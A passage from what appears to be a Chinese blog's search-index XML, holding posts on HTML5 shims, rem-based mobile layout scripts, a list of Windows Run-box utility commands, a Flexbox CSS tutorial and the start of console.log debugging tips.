　　&lt;script src=&quot;//cdn.bootcss.com/respond.js/1.4.2/respond.js&quot;&gt;&lt;/script&gt;
　　&lt;script src=&quot;//cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js&quot;&gt;&lt;/script&gt;
&lt;![endif]--&gt;
</code></pre><blockquote><p>添加以上任意脚本中的一个，之后再在你的 css 文件中编写如下内容。</p></blockquote><pre><code class="css">article,aside,dialog,footer,header,section,footer,nav,figure,menu{
  display:block;
}
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Layout </tag>
            
            <tag> Code </tag>
            
            <tag> HTML5 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[移动端网页自适应方案]]></title>
      <url>/2016/08/layout-project-for-moblie/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>解决移动端网页的自适应，让开发变得更加简洁<a id="more"></a></p><h1 id="mate-标签"><a href="#mate-标签" class="headerlink" title="mate 标签"></a>mate 标签</h1><blockquote><p>首先要让页面大小铺满屏幕又不能溢出。只需要在 html 的 head 标签内加入 viewport（如下），参数分别表示：页面宽度＝屏幕宽度，最大和最小伸缩比都是 1，不允许用户拉缩。</p></blockquote><pre><code class="html">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&gt;
</code></pre><ul><li><strong>width</strong>：viewport 的宽度，可以指定为一个像素值，如：640，或者为特殊的值，如：device-width （设备的宽度）。</li><li><strong>initial-scale</strong>：初始缩放比例，即当浏览器第一次加载页面时的缩放比例。值为 1.0 即原始尺寸。</li><li><strong>maximum-scale</strong>：允许浏览者缩放到的最大比例，一般设为 1.0，即原始尺寸。</li><li><strong>minimum-scale</strong>：允许浏览者缩放到的最小比例，一般设为 1.0，即原始尺寸。</li><li><strong>user-scalable</strong>：浏览者是否可以手动缩放，yes 或 no 。</li></ul><h1 id="使用百分比自适应"><a href="#使用百分比自适应" class="headerlink" title="使用百分比自适应"></a>使用百分比自适应</h1><blockquote><p>把长度单位转换为百分比来表示，这样在不同的宽度下，元素的长宽也会随之变化。</p></blockquote><ul><li>优点：宽度之间无缝衔接， 操作起来也相对比较方便。</li><li>缺点：字体大小需要另外一套自适应方法来调整；当屏幕宽度大于 <code>700px</code> 后，继续按照百分比元素会偏大，这个时候调整起来会比较麻烦。</li></ul><h1 id="rem-em-自适应"><a href="#rem-em-自适应" class="headerlink" title="rem, em 自适应"></a>rem, em 自适应</h1><blockquote><p>用媒体查询的方法，确定在不同屏幕宽度下，改变 html 或 body 的 font-size。再用 rem , em 替代 px 作为单位实现自适应。</p></blockquote><ul><li>优点：可以根据不同屏幕宽度来设置，可以完美解决上面说的屏幕偏大时的比例问题。字体的大小也不存在问题。</li><li>缺点：根据宽度区间来设置，无法实现无缝变换。</li></ul><h1 id="引入-JavaScript-代码"><a href="#引入-JavaScript-代码" class="headerlink" title="引入 JavaScript 代码"></a>引入 JavaScript 代码</h1><blockquote><p>这些兼容方法各有优缺点，都不算完美，怎样才能把优点结合在一起，同时避免缺点呢？ 引入 JavaScript 方法源码，方法原理：使页面 html 的 font-size 会根据屏幕的宽度自动调整，而且屏幕宽度和所设字体大小的商是一定的，然后按照固定比例缩小后作为 rem 的单位长度实现自适应。</p></blockquote><h2 id="方法源码一（需引入-jQuery）"><a href="#方法源码一（需引入-jQuery）" class="headerlink" title="方法源码一（需引入 jQuery）"></a>方法源码一（需引入 jQuery）</h2><pre><code class="javascript">Zepto(function($){
  // 获取文档的根节点
  var doc = document.documentElement;

  function setFontSize() {
    // 获取当前窗口的宽度
    var winWidth =  $(window).width();
    // 640 宽度以上进行限制
    var size = (winWidth / 640) * 100;
    doc.style.fontSize = (size &lt; 100 ? size : 100) + &#39;px&#39; ;
  };

  // 防止在 html 未加载完毕时执行，保证获取正确的页宽
  setTimeout(function(){
    // 初始化
    setFontSize();
  }, 200);
});
</code></pre><h2 id="方法源码二（JavaScript-原生代码）"><a href="#方法源码二（JavaScript-原生代码）" class="headerlink" title="方法源码二（JavaScript 原生代码）"></a>方法源码二（JavaScript 原生代码）</h2><pre><code class="javascript">(function (doc, win) {
  // 获取文档的根节点
  var docEl = doc.documentElement;
  // 判断移动端是否发生方向改变
  var resizeEvt = &#39;orientationchange&#39; in window ? &#39;orientationchange&#39; : &#39;resize&#39;;

  var recalc = function () {
    // 获取对象的宽度
    var clientWidth = docEl.clientWidth;

    if (!clientWidth) return;

    if(clientWidth &gt;= 640) {
      docEl.style.fontSize = &#39;100px&#39;;
    } else {
      docEl.style.fontSize = 100 * (clientWidth / 640) + &#39;px&#39;;
    }
  };

  if (!doc.addEventListener) return;

  win.addEventListener(resizeEvt, recalc, false);
  doc.addEventListener(&#39;DOMContentLoaded&#39;, recalc, false);
})(document, window);
</code></pre><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><blockquote><p>以上两个方法源码是 rem 布局的核心代码。 如果你的页面不需要引入 jQuery，建议你使用 JavaScript 原生代码。 代码大意： 如果页面的宽度超过了 640px，那么页面中 html 的 font-size 恒为 100px，否则，页面中 html 的 font-size 的大小为： 100 * (当前页面宽度 / 640)</p></blockquote><h3 id="为什么是-640px？"><a href="#为什么是-640px？" class="headerlink" title="为什么是 640px？"></a>为什么是 640px？</h3><p>对于手机屏幕来说， <code>640px</code> 的页面宽度是一个安全的最大宽度，保证了移动端页面两边不会留白。注意这里的 <code>px</code> 是 <code>css</code> 逻辑像素，与设备的物理像素是有区别的。 如果要切移动端页面，你可以先把效果图宽度等比例缩放到 <code>640px</code>，很好用。</p><h3 id="为什么要设置-html-的-font-size？"><a href="#为什么要设置-html-的-font-size？" class="headerlink" title="为什么要设置 html 的 font-size？"></a>为什么要设置 html 的 font-size？</h3><p><code>rem</code> 就是根元素（即： <code>html</code>）的字体大小。<code>html</code> 中的所有标签样式凡是涉及到尺寸的（如： <code>height</code>, <code>width</code>, <code>padding</code>, <code>margin</code>, <code>font-size</code>。甚至 <code>left</code>, <code>top</code>等）你都可以放心大胆的用 <code>rem</code>作单位。 如果你把 <code>html</code> 的 <code>font-size</code> 设为 <code>20px</code>，前面说过， <code>rem</code>就是 <code>html</code> 的字体大小，那么 <code>1rem = 20px</code>。</p><h3 id="模拟为什么要使用-iphone-4？"><a href="#模拟为什么要使用-iphone-4？" class="headerlink" title="模拟为什么要使用 iphone 4？"></a>模拟为什么要使用 iphone 4？</h3><p>假设你部门的设计师给你的页面标准宽度为 <code>640px</code>，则页面中所有的 <code>宽高</code> 全部除以 2 ，Chrome 浏览器 模拟手机页面 设置手机型号为 <code>IPhone 4</code>。 这也就是为什么要将所有的宽高除以 2 的原因：<code>IPhone 4</code> 标准 宽 是 <code>320 px</code>。 然后正常的用 <code>px</code> 为单位 写你的 <code>css</code> ，你所需要做的就是你写的页面，要在 <code>IPhone 4</code> 完全正确显示。 如果你说，那设计那边给的不是 <code>640px</code> 标准怎么办？你只要让你的页面按照设计图在 <code>iphone 4</code> 上正确显示，就木问题。</p><h3 id="rem-单位是如何换算的？"><a href="#rem-单位是如何换算的？" class="headerlink" title="rem 单位是如何换算的？"></a>rem 单位是如何换算的？</h3><p>页面 <code>css</code> 全部写完之后，将所有的 <code>px</code> 转换为以 <code>rem</code>为单位的数字。 例如 我设置 <code>body</code> 的 <code>width：320px；</code> 则根据设置的 <code>font - size</code> 值，转换为 <code>rem</code>，则是 <code>width：16 rem；</code> 【320 / 20 (你设置的标准 <code>font - size</code>) = 16】。</p><h3 id="如何使用插件换算？"><a href="#如何使用插件换算？" class="headerlink" title="如何使用插件换算？"></a>如何使用插件换算？</h3><p>如果你说一个页面的 <code>css</code> 有几百行，写完再去改太麻烦了，那可以用 <code>px</code> 转换成 <code>rem</code> 的插件。 我这里有一款推荐：<code>cssrem</code>（下载使用网址 <a href="//github.com/flashlizi/cssrem">cssrem</a>）。 该插件是 <code>sublime text</code> 的一款插件。<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/layout-moblie.gif" alt="cssrem"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> design </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Layout </tag>
            
            <tag> jQuery </tag>
            
            <tag> Moblie </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[运行命令集合]]></title>
      <url>/2016/08/run-commands/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>记录 Windows 常见应用的运行快捷命令，以下记录的命令默认为 win+R 组合键调出的窗口，非命令提示符窗口<a id="more"></a></p><h1 id="策略、管理"><a href="#策略、管理" class="headerlink" title="策略、管理"></a>策略、管理</h1><ul><li><code>gpedit.msc</code> =&gt; 本地组策略</li><li><code>lusrmgr.msc</code> =&gt; 本机用户和组</li><li><code>rsop.msc</code> =&gt; 组策略结果集 <strong>建议在 win2003 下运行</strong></li><li><code>wmimgmt.msc</code> =&gt; 打开 windows 管理体系结构(WMI)</li><li><code>secpol.msc</code> =&gt; 本地安全策略</li><li><code>certmgr.msc</code> =&gt; 证书管理实用程序</li></ul><h1 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h1><ul><li><code>eventvwr</code> =&gt; 事件查看器</li><li><code>compmgmt.msc</code> =&gt; 计算机管理</li><li><code>winmsd</code> =&gt; 系统信息 <strong>建议在 win2003 下运行</strong></li><li><code>perfmon.msc</code> =&gt; 计算机性能监测程序</li><li><code>winver</code> =&gt; 检查 Windows 版本</li><li><code>mmc</code> =&gt; 打开 Microsoft 管理控制台</li><li><code>wupdmgr</code> =&gt; windows 更新程序 <strong>建议在 win2003 下运行</strong></li><li><code>wscript</code> =&gt; windows 脚本宿主设置</li></ul><h1 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h1><ul><li><code>dcomcnfg</code> =&gt; 打开系统组件服务</li><li><code>services.msc</code> =&gt; 本地服务设置</li><li><code>ciadv.msc</code> =&gt; 索引服务程序 <strong>建议在 win2003 下运行</strong></li></ul><h1 id="系统、硬件"><a href="#系统、硬件" class="headerlink" title="系统、硬件"></a>系统、硬件</h1><ul><li><code>logoff</code> =&gt; 注销命令</li><li><code>tsshutdn</code> =&gt; 60 秒倒计时关机命令</li><li><code>cmd</code> =&gt; 命令提示符窗口</li><li><code>regedt32</code> =&gt; 注册表编辑器</li><li><code>regedit.exe</code> =&gt; 注册表编辑器</li><li><code>msconfig.exe</code> =&gt; 系统配置实用程序</li><li><code>ntbackup</code> =&gt; 系统备份和还原 <strong>建议在 win2003 下运行</strong></li><li><code>drwtsn32</code> =&gt; 系统医生 <strong>建议在 win2003 下运行</strong></li></ul><h1 id="磁盘、设备管理"><a href="#磁盘、设备管理" class="headerlink" title="磁盘、设备管理"></a>磁盘、设备管理</h1><ul><li><code>diskmgmt.msc</code> =&gt; 磁盘管理实用程序</li><li><code>dfrg.msc</code> =&gt; 磁盘碎片整理程序 <strong>建议在 win2003 下运行</strong></li><li><code>chkdsk.exe</code> =&gt; Chkdsk 磁盘检查 <strong>建议在 win2003 下运行；或者使用管理员命令提示符窗口运行</strong></li><li><code>cleanmgr</code> =&gt; 垃圾整理</li><li><code>devmgmt.msc</code> =&gt; 设备管理器</li><li><code>ntmsmgr.msc</code> =&gt; 可移动存储管理器 <strong>建议在 win2003 下运行</strong></li><li><code>ntmsoprq.msc</code> =&gt; 可移动存储管理员操作请求 <strong>建议在 win2003 下运行</strong></li></ul><h1 id="应用程序"><a href="#应用程序" class="headerlink" title="应用程序"></a>应用程序</h1><ul><li><code>notepad</code> =&gt; 打开记事本</li><li><code>charmap</code> =&gt; 启动字符映射表</li><li><code>explorer</code> =&gt; 打开资源管理器</li><li><code>calc</code> =&gt; 启动计算器</li><li><code>taskmgr</code> =&gt; 任务管理器</li><li><code>write</code> =&gt; 写字板</li><li><code>mplayer2</code> =&gt; 简易 widnows media player</li><li><code>mspaint</code> =&gt; 画图板</li><li><code>mstsc</code> =&gt; 远程桌面连接</li><li><code>eudcedit</code> =&gt; 专用字符编辑程序</li><li><code>packager</code> =&gt; 对象包装程序 <strong>建议在 win2003 下运行</strong></li><li><code>clipbrd</code> =&gt; 剪贴板查看器 <strong>建议在 win2003 下运行</strong></li><li><code>osk</code> =&gt; 打开屏幕键盘</li><li><code>iexpress</code> =&gt; 木马捆绑工具，系统自带</li></ul><h1 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h1><ul><li><code>nslookup</code> =&gt; 网络管理的工具向导</li><li><code>ncpa.pal</code> =&gt; 网络连接设置向导</li></ul><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> windows </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Security </tag>
            
            <tag> Pentest </tag>
            
            <tag> Windows </tag>
            
            <tag> Command </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Flexbox 布局]]></title>
      <url>/2016/08/flexbox-layout/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>Flex 布局，可以简便、完整、响应式地实现各种页面布局，目前，它已经得到了所有浏览器的支持<a id="more"></a></p><h1 id="GithHub-上优秀的样式表插件"><a href="#GithHub-上优秀的样式表插件" class="headerlink" title="GithHub 上优秀的样式表插件"></a>GithHub 上优秀的样式表插件</h1><blockquote><p><a href="//github.com/vxhly/scss-flex">scss-flex.css</a><br><br><a href="//github.com/lzxb/flex.css">flex.css</a></p></blockquote><h1 id="Flex-布局是什么？"><a href="#Flex-布局是什么？" class="headerlink" title="Flex 布局是什么？"></a>Flex 布局是什么？</h1><blockquote><p>Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。 任何一个容器都可以指定为 Flex 布局。</p></blockquote><h2 id="启用-Flex-布局"><a href="#启用-Flex-布局" class="headerlink" title="启用 Flex 布局"></a>启用 Flex 布局</h2><blockquote><p>设为 Flex 布局以后，子元素的 float、clear 和 vertical-align 属性将失效</p></blockquote><pre><code class="css">/* 块级元素启用 Flex 布局 */
.box-flex {
  display: -ms-flexbox;
  display: -webkit-box;
  display: flex;
}

/* 行内元素启用 Flex 布局 */
.box-inline-flex {
  display: -ms-inline-flexbox;
  display: -webkit-inline-box;
  display: inline-flex;
}
</code></pre><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><blockquote><p>采用 Flex 布局的元素，称为 Flex 容器（flex container），简称”容器”。它的所有子元素自动成为容器成员，称为 Flex 项目（flex item），简称”项目”。</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/flex%20layout.png" alt="flex layout"></p><blockquote><p>容器默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）。主轴的开始位置（与边框的交叉点）叫做 <code>main start</code>，结束位置叫做 <code>main end</code>；交叉轴的开始位置叫做 <code>cross start</code>，结束位置叫做 <code>cross end</code>。<br><br>项目默认沿主轴排列。单个项目占据的主轴空间叫做 <code>main size</code>，占据的交叉轴空间叫做 <code>cross size</code>。</p></blockquote><h1 id="容器的属性"><a href="#容器的属性" class="headerlink" title="容器的属性"></a>容器的属性</h1><p>以下6个属性设置在容器上。</p><ul><li><strong>flex-direction</strong></li><li><strong>flex-wrap</strong></li><li><strong>flex-flow</strong></li><li><strong>justify-content</strong></li><li><strong>align-items</strong></li><li><strong>align-content</strong></li></ul><h2 id="flex-direction"><a href="#flex-direction" class="headerlink" title="flex-direction"></a>flex-direction</h2><blockquote><p><code>flex-direction</code> 属性决定主轴的方向（即项目的排列方向）。</p></blockquote><pre><code class="css">.box {
  flex-direction: row | row-reverse | column | column-reverse;
}
</code></pre><h3 id="四个值分别的作用"><a href="#四个值分别的作用" class="headerlink" title="四个值分别的作用"></a>四个值分别的作用</h3><ul><li>row（默认值）：主轴为水平方向，起点在左端。</li><li>row-reverse：主轴为水平方向，起点在右端。</li><li>column：主轴为垂直方向，起点在上沿。</li><li>column-reverse：主轴为垂直方向，起点在下沿。</li></ul><h2 id="flex-wrap"><a href="#flex-wrap" class="headerlink" title="flex-wrap"></a>flex-wrap</h2><blockquote><p><code>flex-wrap</code> 属性定义，如果一条轴线排不下，如何换行。默认情况下，项目都排在一条线（又称”轴线”）上。</p></blockquote><pre><code class="css">.box{
  flex-wrap: nowrap | wrap | wrap-reverse;
}
</code></pre><h3 id="三个值分别的作用"><a href="#三个值分别的作用" class="headerlink" title="三个值分别的作用"></a>三个值分别的作用</h3><ul><li>nowrap（默认）：不换行。</li><li>wrap：换行，第一行在上方。</li><li>wrap-reverse：换行，第一行在下方。</li></ul><h2 id="flex-flow"><a href="#flex-flow" class="headerlink" title="flex-flow"></a>flex-flow</h2><blockquote><p><code>flex-flow</code> 属性是 <code>flex-direction</code> 属性和 <code>flex-wrap</code> 属性的简写形式，默认值为 <code>row nowrap</code>。</p></blockquote><pre><code class="css">.box {
  flex-flow: &lt;flex-direction&gt; || &lt;flex-wrap&gt;;
}
</code></pre><h2 id="justify-content"><a href="#justify-content" class="headerlink" title="justify-content"></a>justify-content</h2><blockquote><p><code>justify-content</code> 属性定义了项目在主轴上的对齐方式。</p></blockquote><pre><code class="css">.box {
  justify-content: flex-start | flex-end | center | space-between | space-around;
}
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/flex-justify.png" alt="justify-content"></p><h3 id="五个值分别的作用"><a href="#五个值分别的作用" class="headerlink" title="五个值分别的作用"></a>五个值分别的作用</h3><ul><li>flex-start（默认值）：左对齐</li><li>flex-end：右对齐</li><li>center： 居中</li><li>space-between：两端对齐，项目之间的间隔都相等。</li><li>space-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。</li></ul><h2 id="align-items"><a href="#align-items" class="headerlink" title="align-items"></a>align-items</h2><blockquote><p><code>align-items</code> 属性定义项目在交叉轴上如何对齐。</p></blockquote><pre><code class="css">.box {
  align-items: flex-start | flex-end | center | baseline | stretch;
}
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/flex-align.png" alt="align-items"></p><h3 id="五个值分别的作用-1"><a href="#五个值分别的作用-1" class="headerlink" title="五个值分别的作用"></a>五个值分别的作用</h3><ul><li>flex-start：交叉轴的起点对齐。</li><li>flex-end：交叉轴的终点对齐。</li><li>center：交叉轴的中点对齐。</li><li>baseline: 项目的第一行文字的基线对齐。</li><li>stretch（默认值）：如果项目未设置高度或设为auto，将占满整个容器的高度。</li></ul><h2 id="align-content"><a href="#align-content" class="headerlink" title="align-content"></a>align-content</h2><blockquote><p><code>align-content</code> 属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。</p></blockquote><pre><code class="css">.box {
  align-content: flex-start | flex-end | center | space-between | space-around | stretch;
}
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/flex-content.png" alt="align-content"></p><h3 id="六个值分别的作用"><a href="#六个值分别的作用" class="headerlink" title="六个值分别的作用"></a>六个值分别的作用</h3><ul><li>flex-start：与交叉轴的起点对齐。</li><li>flex-end：与交叉轴的终点对齐。</li><li>center：与交叉轴的中点对齐。</li><li>space-between：与交叉轴两端对齐，轴线之间的间隔平均分布。</li><li>space-around：每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍。</li><li>stretch（默认值）：轴线占满整个交叉轴。</li></ul><h1 id="项目的属性"><a href="#项目的属性" class="headerlink" title="项目的属性"></a>项目的属性</h1><p>以下6个属性设置在项目上。</p><ul><li><strong>order</strong></li><li><strong>flex-grow</strong></li><li><strong>flex-shrink</strong></li><li><strong>flex-basis</strong></li><li><strong>flex</strong></li><li><strong>align-self</strong></li></ul><h2 id="order"><a href="#order" class="headerlink" title="order"></a>order</h2><blockquote><p><code>order</code> 属性定义项目的排列顺序。数值越小，排列越靠前，默认为0。</p></blockquote><pre><code class="css">.item {
  order: &lt;integer&gt;;/* default 0 */
}
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/flex-order.png" alt="order"></p><h2 id="flex-grow"><a href="#flex-grow" class="headerlink" title="flex-grow"></a>flex-grow</h2><blockquote><p><code>flex-grow</code> 属性定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大。</p></blockquote><pre><code class="css">.item {
  flex-grow: &lt;number&gt;; /* default 0 */
}
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/flex-grow.png" alt="flex-grow"></p><blockquote><p>如果所有项目的 <code>flex-grow</code> 属性都为1，则它们将等分剩余空间（如果有的话）。如果一个项目的 <code>flex-grow</code> 属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍。</p></blockquote><h2 id="flex-shrink"><a href="#flex-shrink" class="headerlink" title="flex-shrink"></a>flex-shrink</h2><p><code>flex-shrink</code>属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小。</p><pre><code class="css">.item {
  flex-shrink: &lt;number&gt;; /* default 1 */
}
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/flex-shrink.jpg" alt="flex-shrink"></p><blockquote><p>如果所有项目的 <code>flex-shrink</code> 属性都为1，当空间不足时，都将等比例缩小。如果一个项目的flex-shrink属性为0，其他项目都为1，则空间不足时，前者不缩小。<br><br>负值对该属性无效。</p></blockquote><h2 id="flex-basis"><a href="#flex-basis" class="headerlink" title="flex-basis"></a>flex-basis</h2><blockquote><p><code>flex-basis</code> 属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。</p></blockquote><pre><code class="css">.item {
  flex-basis: &lt;length&gt; | auto; /* default auto */
}
</code></pre><blockquote><p>它可以设为跟 <code>width</code> 或 <code>height</code> 属性一样的值（比如350px），则项目将占据固定空间。</p></blockquote><h2 id="flex"><a href="#flex" class="headerlink" title="flex"></a>flex</h2><blockquote><p><code>flex</code> 属性是 <code>flex-grow</code>, <code>flex-shrink</code> 和 <code>flex-basis</code> 的简写，默认值为 <code>0 1 auto</code>。后两个属性可选。</p></blockquote><pre><code class="css">.item {
  flex: none | [ &lt;&#39;flex-grow&#39;&gt; &lt;&#39;flex-shrink&#39;&gt;? || &lt;&#39;flex-basis&#39;&gt; ]
}
</code></pre><blockquote><p>该属性有两个快捷值： <code>auto (1 1 auto)</code> 和 <code>none (0 0 auto)</code>。 建议优先使用这个属性，而不是单独写三个分离的属性，因为浏览器会推算相关值。</p></blockquote><h2 id="align-self"><a href="#align-self" class="headerlink" title="align-self"></a>align-self</h2><blockquote><p><code>align-self</code> 属性允许单个项目有与其他项目不一样的对齐方式，可覆盖 <code>align-items</code> 属性。默认值为 <code>auto</code>，表示继承父元素的 <code>align-items</code> 属性，如果没有父元素，则等同于 <code>stretch</code>。</p></blockquote><pre><code class="css">.item {
  align-self: auto | flex-start | flex-end | center | baseline | stretch;
}
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/flex-self.png" alt="align-self"></p><blockquote><p>该属性可能取六个值，除了 <code>auto</code>，其他都与 <code>align-items</code> 属性完全一致。</p></blockquote><h1 id="常用-Flex-布局集合"><a href="#常用-Flex-布局集合" class="headerlink" title="常用 Flex 布局集合"></a>常用 Flex 布局集合</h1><pre><code class="css">/* 默认开启换行 */

.box-flex {
  display: -ms-flexbox;
  display: -webkit-flex;
  display: -webkit-box;
  display: flex;
  -webkit-flex-wrap: wrap;
  -ms-flex-wrap: wrap;
  flex-wrap: wrap;
}

.box-inline-flex {
  display: -ms-inline-flexbox;
  display: -webkit-inline-flex;
  display: -webkit-inline-box;
  display: inline-flex;
  -webkit-flex-wrap: wrap;
  -ms-flex-wrap: wrap;
  flex-wrap: wrap;
}


/* 不换行 */

.box-flex-nowarp {
  display: -webkit-flex;
  display: -ms-flexbox;
  display: -webkit-box;
  display: flex;
  -webkit-flex-wrap: nowrap;
  -ms-flex-wrap: nowrap;
  flex-wrap: nowrap;
}

.box-inline-flex {
  display: -webkit-inline-flex;
  display: -ms-inline-flexbox;
  display: -webkit-inline-box;
  display: inline-flex;
  -webkit-flex-wrap: nowrap;
  -ms-flex-wrap: nowrap;
  flex-wrap: nowrap;
}


/* X 轴居中 */

.flex-row-center {
  flex-direction: row;
  -webkit-box-orient: horizontal;
  -webkit-box-direction: normal;
  -webkit-flex-direction: row;
  -ms-flex-direction: row;
  -ms-flex-pack: center;
  -webkit-justify-content: center;
  -webkit-box-pack: center;
  justify-content: center;
}


/* Y 轴居中 */

.flex-column-center {
  flex-direction: column;
  -webkit-box-orient: vertical;
  -webkit-box-direction: normal;
  -webkit-flex-direction: column;
  -ms-flex-direction: column;
  -ms-flex-align: center;
  -webkit-align-items: center;
  -ms-grid-row-align: center;
  -webkit-box-align: center;
  align-items: center;
}


/* XY 轴居中  */

.felx-row-column-center {
  -ms-flex-pack: center;
  -webkit-justify-content: center;
  -webkit-box-pack: center;
  justify-content: center;
  -ms-flex-align: center;
  -webkit-align-items: center;
  -ms-grid-row-align: center;
  -webkit-box-align: center;
  align-items: center;
}


/* X 轴两端对齐 */

.flex-row-between {
  flex-direction: row;
  -webkit-box-orient: horizontal;
  -webkit-box-direction: normal;
  -webkit-flex-direction: row;
  -ms-flex-direction: row;
  -ms-flex-pack: justify;
  -webkit-justify-content: space-between;
  -webkit-box-pack: justify;
  justify-content: space-between;
}


/* X 轴分散式对齐 */

.flex-row-around {
  flex-direction: row;
  width: 100%;
  -webkit-box-orient: horizontal;
  -webkit-box-direction: normal;
  -webkit-flex-direction: row;
  -ms-flex-direction: row;
  -ms-flex-pack: distribute;
  -webkit-justify-content: space-around;
  justify-content: space-around;
}


/* Y 轴两端对齐 */

.flex-column-between {
  flex-direction: column;
  -webkit-box-orient: vertical;
  -webkit-box-direction: normal;
  -webkit-flex-direction: column;
  -ms-flex-direction: column;
  -webkit-justify-content: space-between;
  -ms-flex-pack: justify;
  -webkit-box-pack: justify;
  justify-content: space-between;
}


/* Y 轴分散式对齐 */

.flex-column-around {
  flex-direction: column;
  -webkit-box-orient: vertical;
  -webkit-box-direction: normal;
  -webkit-flex-direction: column;
  -ms-flex-direction: column;
  -webkit-justify-content: space-around;
  -ms-flex-pack: distribute;
  justify-content: space-around;
}
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> design </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
            <tag> Layout </tag>
            
            <tag> Code </tag>
            
            <tag> HTML5 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Console 的一些应用小技巧]]></title>
      <url>/2016/08/some-tips-for-console/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>一个简单而实用的控制台命令，用来调试 JavaScript 代码的不合理性<a id="more"></a></p><h1 id="console-log-object"><a href="#console-log-object" class="headerlink" title="console.log(object)"></a>console.log(object)</h1><blockquote><p>一个取代 alert() 和 document.write() 的最佳途径。是前端开发人员使用频率最高的一条语句，它向控制台输出一条消息。支持 C 语言 printf 式的格式化输出。当然，也可以不使用格式化输出来达到同样的目的。</p></blockquote><h2 id="简单的输出"><a href="#简单的输出" class="headerlink" title="简单的输出"></a>简单的输出</h2><pre><code class="javascript">var animal = &#39;tiger&#39;;
var count = 5;
console.log(&#39;The %s jumped over %d tall buildings&#39;, animal, count);
console.log(&#39;The&#39;, animal, &#39;jumped over&#39;, count, &#39;tall buildings&#39;);
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/debug-console-1.png" alt="console.log"></p><blockquote><p>console 对象可以使用 printf 风格的占位符。支持的占位符，有字符（%s）、整数（%d或%i）、浮点数（%f）和对象（%o）四种。</p></blockquote><h2 id="有意思的-c"><a href="#有意思的-c" class="headerlink" title="有意思的 %c"></a>有意思的 %c</h2><pre><code class="javascript">console.log(&#39;%c css88.com&#39;, &#39;font-size:20pt&#39;);
console.log(&#39;%c 前端开发 %c css88.com %c github&#39;, &#39;color:red&#39;,&#39;&#39;,&#39;color:orange;font-weight:bold&#39;);
console.log(&#39;%c 阴影文字&#39;, &#39;text-shadow: 3px 1px 1px grey&#39;);
console.log(&#39;%c 彩色文字&#39;, &#39;background-image:-webkit-gradient( linear, left top, right top, color-stop(0, #f22), color-stop(0.15, #f2f), color-stop(0.3, #22f), color-stop(0.45, #2ff), color-stop(0.6, #2f2),color-stop(0.75, #2f2), color-stop(0.9, #ff2), color-stop(1, #f22) );color:transparent;-webkit-background-clip: text;font-size:5em;&#39;);
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/debug-console-2.png" alt="console.log"></p><blockquote><p>以%c开头，后面的文字就打印的信息，后面一个参数就是样式属性；可以尝试多个样式，每碰到一个%c开头就会应用对应的样式。</p></blockquote><h1 id="不同性质的信息用不同的方法"><a href="#不同性质的信息用不同的方法" class="headerlink" title="不同性质的信息用不同的方法"></a>不同性质的信息用不同的方法</h1><blockquote><p>根据信息的不同性质， console 对象还有4种显示信息的方法，分别是一般信息 console.info()、除错信息 console.debug()、警告提示 console.warn()、错误提示 console.error()。</p></blockquote><pre><code class="javascript">console.info(&#39;this is info&#39;);
console.debug(&#39;this is debug&#39;);
console.warn(&#39;this is warn&#39;);
console.error(&#39;this is error&#39;);
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/debug-console-3.png" alt="console.log"></p><h2 id="console-debug-object"><a href="#console-debug-object" class="headerlink" title="console.debug(object)"></a>console.debug(object)</h2><pre><code class="javascript">console.debug(object[, object, …])
